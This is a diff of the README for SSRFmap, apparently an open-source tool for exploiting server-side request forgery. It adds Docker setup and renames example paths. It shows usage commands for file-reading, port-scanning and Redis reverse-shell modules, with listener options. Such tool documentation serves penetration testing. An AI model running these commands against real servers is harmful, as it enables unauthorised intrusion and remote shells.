@@ -45,37 +45,45 @@ The following modules are already implemented and can be used with the `-m` argu
 
 ## Install and Manual
 
-Basic install from the Github repository.
+* From the Github repository.
+  ```powershell
+  $ git clone https://github.com/swisskyrepo/SSRFmap
+  $ cd SSRFmap/
+  $ pip3 install -r requirements.txt
+  $ python3 ssrfmap.py
 
-```powershell
-$ git clone https://github.com/swisskyrepo/SSRFmap
-$ cd SSRFmap/
-$ pip3 install -r requirements.txt
-$ python3 ssrfmap.py
+    usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
+                      [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]
+                      [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]
 
-  usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
-                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]
-                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]
+    optional arguments:
+      -h, --help          show this help message and exit
+      -r REQFILE          SSRF Request file
+      -p PARAM            SSRF Parameter to target
+      -m MODULES          SSRF Modules to enable
+      -l HANDLER          Start an handler for a reverse shell
+      -v [VERBOSE]        Enable verbosity
+      --lhost LHOST       LHOST reverse shell
+      --lport LPORT       LPORT reverse shell
+      --uagent USERAGENT  User Agent to use
+      --ssl [SSL]         Use HTTPS without verification
+      --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)
+      --level [LEVEL]     Level of test to perform (1-5, default: 1)
+  ```
 
-  optional arguments:
-    -h, --help          show this help message and exit
-    -r REQFILE          SSRF Request file
-    -p PARAM            SSRF Parameter to target
-    -m MODULES          SSRF Modules to enable
-    -l HANDLER          Start an handler for a reverse shell
-    -v [VERBOSE]        Enable verbosity
-    --lhost LHOST       LHOST reverse shell
-    --lport LPORT       LPORT reverse shell
-    --uagent USERAGENT  User Agent to use
-    --ssl [SSL]         Use HTTPS without verification
-    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)
-    --level [LEVEL]     Level of test to perform (1-5, default: 1)
-```
+* Docker
+  ```powershell
+  $ git clone https://github.com/swisskyrepo/SSRFmap
+  $ docker build --no-cache -t ssrfmap .
+  $ docker run -it ssrfmap ssrfmap.py [OPTIONS] 
+  $ docker run -it -v $(pwd):/usr/src/app ssrfmap ssrfmap.py
+  ```
+
 
 ## Examples
 
 First you need a request with a parameter to fuzz, Burp requests works well with SSRFmap. 
-They should look like the following. More examples are available in the **/data** folder.
+They should look like the following. More examples are available in the **./examples** folder.
 
 ```powershell
 POST /ssrf HTTP/1.1
@@ -97,21 +105,21 @@ Use the `-m` followed by module name (separated by a `,` if you want to launch s
 
 ```powershell
 # Launch a portscan on localhost and read default files
-python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
+python ssrfmap.py -r examples/request.txt -p url -m readfiles,portscan
 ```
 
 If you need to have a custom user-agent use the `--uagent`. Some targets will use HTTPS, you can enable it with `--ssl`.
 
 ```powershell
 # Launch a portscan against an HTTPS endpoint using a custom user-agent
-python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
+python ssrfmap.py -r examples/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
 ```
 
 Some modules allow you to create a connect back, you have to specify LHOST and LPORT. Also SSRFmap can listen for the incoming reverse shell.
 
 ```powershell
 # Triggering a reverse shell on a Redis
-python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
+python ssrfmap.py -r examples/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
 
 # -l create a listener for reverse shell on the specified port
 # --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
@@ -127,10 +135,19 @@ When the target is protected by a WAF or some filters you can try a wide range o
 
 A quick way to test the framework can be done with `data/example.py` SSRF service.
 
-```powershell
-FLASK_APP=data/example.py flask run &
-python ssrfmap.py -r data/request.txt -p url -m readfiles
-```
+* Local
+  ```powershell
+  FLASK_APP=examples/example.py flask run &
+  python ssrfmap.py -r examples/request.txt -p url -m readfiles
+  ```
+
+* Docker
+  ```ps1
+  docker build --no-cache -t ssrfmap .
+  docker run -it -v $(pwd):/usr/src/app --name example ssrfmap examples/example.py
+  docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m readfiles
+  ```
+
 
 ## Contribute
 
